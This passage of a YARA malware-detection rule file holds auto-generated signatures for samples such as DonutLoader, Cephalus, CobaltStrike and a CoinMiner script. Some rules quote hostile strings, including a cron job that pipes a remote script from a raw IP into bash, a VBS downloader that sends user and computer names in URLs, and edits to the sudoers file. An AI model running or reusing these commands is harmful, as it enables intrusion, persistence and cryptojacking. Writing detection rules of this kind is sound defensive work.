      $s2 = "strBatFileName = fs.BuildPath(fs.GetSpecialFolder(TemporaryFolder), \"dwn.bat\")" fullword ascii /* score: '23.00'*/
      $s3 = "\"url_array(3) = \"\"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\"\" & userName & separ & computerName & \"\"" ascii /* score: '23.00'*/
      $s4 = "CreateObject(\"Wscript.Shell\").Run \"dwn.bat\",0,False" fullword ascii /* score: '19.00'*/
      $s5 = "Const TemporaryFolder = 2 'Scripting.SpecialFolderConst.TemporaryFolder" fullword ascii /* score: '17.00'*/
      $s6 = "\"url_array(2) = \"\"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/ORD-2020.txt\"\" \"" fullword ascii /* score: '17.00'*/
      $s7 = "ts.writeline \"set oShellEnv = oShell.Environment(\"\"Process\"\")\"" fullword ascii /* score: '17.00'*/
      $s8 = "strBatFileName = fs.GetAbsolutePathName(fs.BuildPath(Wscript.ScriptFullName, \"..\\\" & \"dwn.bat\"))" fullword ascii /* score: '17.00'*/
      $s9 = "'objShell.Run \"dwn.bat\" " fullword ascii /* score: '16.00'*/
      $s10 = "\"url_array(3) = \"\"http://www.scuolaelementarediorziveccho.191.it/Public/ORD-ALL/\"\" & userName & separ & computerName & \"\"" ascii /* score: '16.00'*/
      $s11 = "\"Dim oShell , separ , comp , computerName , userName , oShellEnv , a\"" fullword ascii /* score: '15.00'*/
      $s12 = "\"url_array(0) = \"\"http://www.steinber.org/PA/ORDINI.TXT\"\" \"" fullword ascii /* score: '14.00'*/
      $s13 = "''wsh.Run \"dwn.bat\" & strBatFileName & \"dwn.bat\", WshNormalFocus, True" fullword ascii /* score: '14.00'*/
      $s14 = "strBatFileName = \"C:\\tmp\"" fullword ascii /* score: '13.00'*/
      $s15 = "''If MsgBox (\"This program will create, run, and delete a simple \"\"Hello world\"\" batch file. Continue?\", vbOkCancel) = vbC" ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x4f09 and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _d4ce49ccb94d5c427f8850024ed3767efa64ec74101ca59e88a844ab48c803a4_d4ce49cc_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2a05603_69 {
   meta:
      description = "_subset_batch - from files d4ce49ccb94d5c427f8850024ed3767efa64ec74101ca59e88a844ab48c803a4_d4ce49cc.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2a05603f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d4ce49ccb94d5c427f8850024ed3767efa64ec74101ca59e88a844ab48c803a4"
      hash2 = "2a05603fd3adbd7c74e32248e6da4e52dc8fc1412910c0f473261996ad4f8652"
   strings:
      $s1 = "67547&55&'7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'gTuW' */
      $s2 = "326754&#\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '2gT' */
      $s3 = "32654&'#5" fullword ascii /* score: '9.00'*/ /* hex encoded string '2eE' */
      $s4 = "326554&\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '2eT' */
      $s5 = "32654&$&&54632" fullword ascii /* score: '9.00'*/ /* hex encoded string '2eEF2' */
      $s6 = "#\"&547&&54632" fullword ascii /* score: '9.00'*/ /* hex encoded string 'TuF2' */
      $s7 = "#\"&'5463" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Tc' */
      $s8 = "'#535#536" fullword ascii /* score: '9.00'*/ /* hex encoded string 'SU6' */
      $s9 = "#\"$'#535#536$32" fullword ascii /* score: '9.00'*/ /* hex encoded string 'SU62' */
      $s10 = "326554&##" fullword ascii /* score: '9.00'*/ /* hex encoded string '2eT' */
      $s11 = "4&$&&54632" fullword ascii /* score: '9.00'*/ /* hex encoded string 'EF2' */
      $s12 = "32654'#536" fullword ascii /* score: '9.00'*/ /* hex encoded string '2eE6' */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ca9b1a39503792da1c4d11741d205b38_imphash__e51edaffc92e0c16edc94bfa957b4f42_imphash__e51edaffc92e0c16edc94bfa957b4f42_imphas_70 {
   meta:
      description = "_subset_batch - from files ca9b1a39503792da1c4d11741d205b38(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_2528966f.exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_4aa1f9fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ba160a62755295ba6e21d3d4b0188ed8913497271b9af9891709a2d2840ad1e5"
      hash2 = "256bf3b4643382351881da45ecf5769c1e84838935f98b526ecb5bac3eb997e9"
      hash3 = "2528966f9b7aea294869d181c104085eda3170b514d8d92f75b2d0cefa3c2bfa"
      hash4 = "4aa1f9fa9a51caa4513114a6d215fdcef787f5ec569dc1bfa526fd4026a394a3"
   strings:
      $s1 = "[io] %s: MousePos (-FLT_MAX, -FLT_MAX)" fullword ascii /* score: '13.50'*/
      $s2 = "SetActiveID() old:0x%08X (window \"%s\") -> new:0x%08X (window \"%s\")" fullword ascii /* score: '11.00'*/
      $s3 = "[popup] CloseCurrentPopup %d -> %d" fullword ascii /* score: '11.00'*/
      $s4 = "[io] %s: MousePos (%.1f, %.1f) (%s)" fullword ascii /* score: '9.50'*/
      $s5 = "[io] %s: AppFocused %d" fullword ascii /* score: '9.50'*/
      $s6 = "[io] %s: Key \"%s\" %s" fullword ascii /* score: '9.50'*/
      $s7 = "[io] %s: Text: %c (U+%08X)" fullword ascii /* score: '9.50'*/
      $s8 = "[io] %s: MouseButton %d %s (%s)" fullword ascii /* score: '9.50'*/
      $s9 = "[io] %s: MouseWheel (%.3f, %.3f) (%s)" fullword ascii /* score: '9.50'*/
      $s10 = "AppForward" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( all of them )
      ) or ( all of them )
}

rule _dd6e96d3bf730f53d2852bde2439748e651cae48e68448923f662e802a1e7e1b_dd6e96d3_ec05de89bf6b2dab562e4285b5e4a950_imphash__71 {
   meta:
      description = "_subset_batch - from files dd6e96d3bf730f53d2852bde2439748e651cae48e68448923f662e802a1e7e1b_dd6e96d3.exe, ec05de89bf6b2dab562e4285b5e4a950(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd6e96d3bf730f53d2852bde2439748e651cae48e68448923f662e802a1e7e1b"
      hash2 = "c9a8f1c383fcdaca8f562fb65149239673076f4f5c38aa9ca9e8ff49a1ad1c05"
   strings:
      $s1 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s2 = "fatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s3 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\reentrant_lock.rs" fullword ascii /* score: '15.00'*/
      $s4 = "thread panicked while processing panic. aborting." fullword ascii /* score: '15.00'*/
      $s5 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s6 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '14.00'*/
      $s7 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s8 = "too largeresource busyexecutable file busydeadlockcross-device link or renametoo many linksinvalid filenameargument list too lon" ascii /* score: '12.00'*/
      $s9 = "SetThreadDescription" fullword ascii /* score: '10.00'*/
      $s10 = "failed printing to " fullword ascii /* score: '9.00'*/
      $s11 = "a formatting trait implementation returned an error when the underlying stream did not" fullword ascii /* score: '9.00'*/
      $s12 = "failed to write whole buffer" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_72 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
   strings:
      $s1 = "eemheap.freeSpanLocked - invalid span stateattempted to add zero-sized address rangeruntime: blocked read on closing polldescrun" ascii /* score: '28.00'*/
      $s2 = "runtime: setevent failed; errno=runtime.semasleep wait_abandonedsync: Unlock of unlocked RWMutexsync: negative WaitGroup counter" ascii /* score: '21.00'*/
      $s3 = "syscall.GetProcessTimes" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.GetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.GetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s6 = "ent is gcSweep being done but phase is not GCoffobjects added out of order or overlappingmheap.freeSpanLocked - invalid stack fr" ascii /* score: '17.00'*/
      $s7 = "syscall.CreateProcessAsUser" fullword ascii /* score: '17.00'*/
      $s8 = "os.(*Process).signal.deferwrap2" fullword ascii /* score: '15.00'*/
      $s9 = "os.(*Process).signal.deferwrap1" fullword ascii /* score: '15.00'*/
      $s10 = "os.(*Process).wait.deferwrap2" fullword ascii /* score: '15.00'*/
      $s11 = "os.(*Process).wait.deferwrap1" fullword ascii /* score: '15.00'*/
      $s12 = "ParentProcess" fullword ascii /* score: '15.00'*/
      $s13 = "syscall.StartProcess.deferwrap1" fullword ascii /* score: '14.00'*/
      $s14 = "syscall.StartProcess.deferwrap3" fullword ascii /* score: '14.00'*/
      $s15 = "syscall.TerminateProcess" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__2c60ff4c_CoinMiner_signature__b8b15833_73 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature)_2c60ff4c.sh, CoinMiner(signature)_b8b15833.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c60ff4c5ffdad29f0425aa4951506b99fd5792f2e299962fbc99969f5e82850"
      hash2 = "b8b15833c5fed4b3d1393d1d6729099fca39aad8199fd6f8c7e5fb3f36d9732f"
   strings:
      $s1 = "if ! crontab -l 2>/dev/null | grep -q \"wget -O - http://162.248.53.119:8000/mon.sh | bash\"; then" fullword ascii /* score: '29.00'*/
      $s2 = "        if wget -qO- --timeout=3 -4 http://ip-api.com/json/ | grep -q '\"country\":\"China\"'; then" fullword ascii /* score: '29.00'*/
      $s3 = "# Function to download and execute a script" fullword ascii /* score: '25.00'*/
      $s4 = "    (crontab -l 2>/dev/null; echo \"*/30 * * * * wget -O - http://162.248.53.119:8000/mon.sh | bash\") | crontab -" fullword ascii /* score: '24.00'*/
      $s5 = "# Function to monitor and kill high CPU usage processes" fullword ascii /* score: '24.00'*/
      $s6 = "        sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1" fullword ascii /* score: '23.00'*/
      $s7 = "download_and_execute() {" fullword ascii /* score: '22.00'*/
      $s8 = "        if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '\"country\":\"China\"'; then" fullword ascii /* score: '20.00'*/
      $s9 = "    pids=$(pgrep -f \"list.com:9443|list.com:1443\" | while read pid; do" fullword ascii /* score: '20.00'*/
      $s10 = "        grep -c ^processor /proc/cpuinfo" fullword ascii /* score: '18.00'*/
      $s11 = "    # Execute if download succeeded" fullword ascii /* score: '17.00'*/
      $s12 = "    if command -v curl &> /dev/null; then" fullword ascii /* score: '15.00'*/
      $s13 = "kill_high_cpu_processes" fullword ascii /* score: '15.00'*/
      $s14 = "    hostname | grep -qi -e \"ec2\" -e \"compute\"" fullword ascii /* score: '15.00'*/
      $s15 = "    elif command -v wget &> /dev/null; then" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_Cephalus_signature__d42595b695_74 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash4 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash5 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash6 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash7 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash8 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "internal/abi.(*IntArgRegBitmap).Get" fullword ascii /* score: '12.00'*/
      $s2 = "aeshashbody" fullword ascii /* score: '11.00'*/
      $s3 = "runtime.sigpanic0" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.funcInfo.valid" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.spillArgs" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.initAlgAES" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.stackcheck" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.unspillArgs" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.init.1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.settls" fullword ascii /* score: '10.00'*/
      $s11 = "internal/cpu.xgetbv" fullword ascii /* score: '9.00'*/
      $s12 = "memeqbody" fullword ascii /* score: '8.00'*/
      $s13 = "indexbytebody" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb2_75 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash3 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "bytes.IndexRune" fullword ascii /* score: '10.00'*/
      $s2 = "slices.partitionEqualCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.File" ascii /* score: '10.00'*/
      $s3 = "slices.partitionCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode " ascii /* score: '10.00'*/
      $s4 = "slices.medianCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode }]" fullword ascii /* score: '10.00'*/
      $s5 = "slices.partitionCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode " ascii /* score: '10.00'*/
      $s6 = "slices.insertionSortCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileM" ascii /* score: '10.00'*/
      $s7 = "slices.breakPatternsCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileM" ascii /* score: '10.00'*/
      $s8 = "slices.SortFunc[go.shape.[]io/fs.DirEntry,go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type" ascii /* score: '10.00'*/
      $s9 = "slices.siftDownCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode }" ascii /* score: '10.00'*/
      $s10 = "slices.heapSortCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode }" ascii /* score: '10.00'*/
      $s11 = "slices.medianAdjacentCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.File" ascii /* score: '10.00'*/
      $s12 = "slices.partialInsertionSortCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/f" ascii /* score: '10.00'*/
      $s13 = "slices.choosePivotCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMod" ascii /* score: '10.00'*/
      $s14 = "slices.siftDownCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileMode }" ascii /* score: '10.00'*/
      $s15 = "slices.insertionSortCmpFunc[go.shape.interface { Info() (io/fs.FileInfo, error); IsDir() bool; Name() string; Type() io/fs.FileM" ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _b6a3b3c31afeb6b4fc16e5131cb9ba15_imphash__b6a3b3c31afeb6b4fc16e5131cb9ba15_imphash__473eb009_DonutLoader_signature__6746a1f_76 {
   meta:
      description = "_subset_batch - from files b6a3b3c31afeb6b4fc16e5131cb9ba15(imphash).exe, b6a3b3c31afeb6b4fc16e5131cb9ba15(imphash)_473eb009.exe, DonutLoader(signature)_6746a1f2174147ee30822d9f94dff1dc(imphash).exe, DonutLoader(signature)_6746a1f2174147ee30822d9f94dff1dc(imphash)_9ee88e73.exe, DonutLoader(signature)_6746a1f2174147ee30822d9f94dff1dc(imphash)_c61b9f54.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "52fc3f93a56445c2c0eaa8e604b25d6682e5b19b78db5c4caf43eb4e5e42a1d9"
      hash2 = "473eb009bb9060018345aabef2d2e7305e67e2362c5cf1f058a5f668b8446ef7"
      hash3 = "fb160c5b2e415dfb74c221bd1f7ffaf5c976cd97cfe08e5e8fa74f46a556a309"
      hash4 = "9ee88e73276f24cf511c95d66577e7290e3ba740260e73d804dc469d5ca7b54a"
      hash5 = "c61b9f54b596de417827bf2842ed3153f2ae6d79a184f3cc544a3a57d842a156"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '48.00'*/
      $s2 = "urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false" ascii /* score: '26.00'*/
      $s3 = "equestedExecutionLevel></requestedPrivileges></security></trustInfo><asmv3:application xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '18.00'*/
      $s4 = "<asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\"><dpiAware xmlns=\"http://schemas.microsof" ascii /* score: '17.00'*/
      $s5 = "om/SMI/2005/WindowsSettings\">True/PM</dpiAware><dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">Pe" ascii /* score: '17.00'*/
      $s6 = "\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility" ascii /* score: '10.00'*/
      $s7 = "ility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f9" ascii /* score: '10.00'*/
      $s8 = "1\" Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms_compatib" ascii /* score: '10.00'*/
      $s9 = ":schemas-microsoft-com:compatibility.v1\" Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"></ms_compatibility:supportedOS><ms_compa" ascii /* score: '10.00'*/
      $s10 = "on xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\"><ms_compatibility:supportedOS xmlns:ms_compatibility=\"" ascii /* score: '10.00'*/
      $s11 = "ompatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48f" ascii /* score: '10.00'*/
      $s12 = "ty=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"></ms_compatibility:supportedOS><" ascii /* score: '10.00'*/
      $s13 = "directory_iterator::operator++" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _e51edaffc92e0c16edc94bfa957b4f42_imphash__2528966f_e51edaffc92e0c16edc94bfa957b4f42_imphash__4aa1f9fa_77 {
   meta:
      description = "_subset_batch - from files e51edaffc92e0c16edc94bfa957b4f42(imphash)_2528966f.exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_4aa1f9fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2528966f9b7aea294869d181c104085eda3170b514d8d92f75b2d0cefa3c2bfa"
      hash2 = "4aa1f9fa9a51caa4513114a6d215fdcef787f5ec569dc1bfa526fd4026a394a3"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '44.00'*/
      $s2 = "Core Temp.exe" fullword wide /* score: '26.00'*/
      $s3 = "urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"requireAdministrator\" uiAcce" ascii /* score: '22.00'*/
      $s4 = "piAware><dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2, PerMonitor</dpiAwareness></m" ascii /* score: '17.00'*/
      $s5 = "s:ms_asmv1=\"urn:schemas-microsoft-com:asm.v1\"><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/p" ascii /* score: '17.00'*/
      $s6 = "\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><asmv3:application><ms_asmv1:windowsSettings xm" ascii /* score: '15.00'*/
      $s7 = "CPU temperature and system information utility" fullword wide /* score: '14.00'*/
      $s8 = "Copyright (C) 2006 - 2023 ALCPU" fullword wide /* score: '12.00'*/
      $s9 = "Core Temp" fullword wide /* score: '11.00'*/
      $s10 = "lity=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"></ms_compatibility:supportedOS" ascii /* score: '10.00'*/
      $s11 = "ibility.v1\" Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms" ascii /* score: '10.00'*/
      $s12 = "_compatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{4a2f28e3-53b9-4441-ba9c-d" ascii /* score: '10.00'*/
      $s13 = "mpatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"></ms_compatibility:supp" ascii /* score: '10.00'*/
      $s14 = "4a4a6e38}\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:comp" ascii /* score: '10.00'*/
      $s15 = ".v1\" Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms_compat" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and pe.imphash() == "e51edaffc92e0c16edc94bfa957b4f42" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _c0d8d0d31350af20d0982b9da9f8274c69b16a4b04b32b77dbfa9d96fac7e86c_c0d8d0d3_df2ef99ef65b2b741311c2c50b3c74bfe1093c732b26dbec4_78 {
   meta:
      description = "_subset_batch - from files c0d8d0d31350af20d0982b9da9f8274c69b16a4b04b32b77dbfa9d96fac7e86c_c0d8d0d3.sh, df2ef99ef65b2b741311c2c50b3c74bfe1093c732b26dbec4ca1e4fd6341c1ff_df2ef99e.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0d8d0d31350af20d0982b9da9f8274c69b16a4b04b32b77dbfa9d96fac7e86c"
      hash2 = "df2ef99ef65b2b741311c2c50b3c74bfe1093c732b26dbec4ca1e4fd6341c1ff"
   strings:
      $s1 = "    sed -i \"/Allows people in group wheel to run all commands/a\\ocean           ALL=(ALL)       ALL\" /etc/sudoers" fullword ascii /* score: '18.00'*/
      $s2 = "sed -i \"s/#Port 22/Port 2222/g\" /etc/ssh/sshd_config || sed -i \"s/Port 22/Port 2222/g\" /etc/ssh/sshd_config" fullword ascii /* score: '18.00'*/
      $s3 = "read -s -p \"" fullword ascii /* score: '15.00'*/
      $s4 = "    echo \"alias t12='tail -f  /soft/bea/tomcat4.2/logs/catalina.out'\" >> /root/.bash_profile" fullword ascii /* score: '14.00'*/
      $s5 = "if [[ ! -d \"/soft\" ]]; then" fullword ascii /* score: '12.00'*/
      $s6 = "    echo 'export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH:$HOMR/bin' >> /root/.bash_profile" fullword ascii /* score: '12.00'*/
      $s7 = "    echo \"export LANG=zh_CN.UTF-8\" >> /root/.bash_profile" fullword ascii /* score: '12.00'*/
      $s8 = "ln -sf /usr/local/freeswitch/bin/freeswitch /usr/bin/" fullword ascii /* score: '10.00'*/
      $s9 = "ln -sf /usr/local/freeswitch/bin/fs_cli /usr/bin/" fullword ascii /* score: '10.00'*/
      $s10 = "echo \"cd /etc/openvpn/ && openvpn /etc/openvpn/client.ovpn > /dev/null &\" >> /etc/rc.local" fullword ascii /* score: '10.00'*/
      $s11 = "    echo \"alias ebin='cd /soft/ocean/ocean/mod/mod_ola/ebin'\" >> /root/.bash_profile" fullword ascii /* score: '9.00'*/
      $s12 = "    echo \"export PATH\" >> /root/.bash_profile" fullword ascii /* score: '9.00'*/
      $s13 = "    echo \"export RUNPATH=/soft/bea/run\" >> /root/.bash_profile" fullword ascii /* score: '9.00'*/
      $s14 = "systemctl restart sshd" fullword ascii /* score: '9.00'*/
      $s15 = "    echo \"export JAVA_HOME=/etc/alternatives/jre_1.8.0_openjdk\" >> /root/.bash_profile" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 80KB and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_da06a1fea03a65303b4dd9e7cc4337_79 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash4 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash5 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
